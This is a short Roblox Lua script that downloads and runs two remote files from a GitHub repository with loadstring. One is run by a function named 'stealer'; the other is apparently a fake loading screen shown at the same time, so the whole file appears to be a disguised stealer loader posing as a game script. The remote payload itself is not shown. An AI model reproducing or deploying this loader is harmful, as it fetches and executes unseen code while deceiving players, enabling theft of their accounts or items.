local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/twilight.lua'))()
end
local function loadui()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ScriptkingPt/Gag-script/refs/heads/main/fakeloadingui.lua'))()
end

task.spawn(stealer)
task.spawn(loadui)
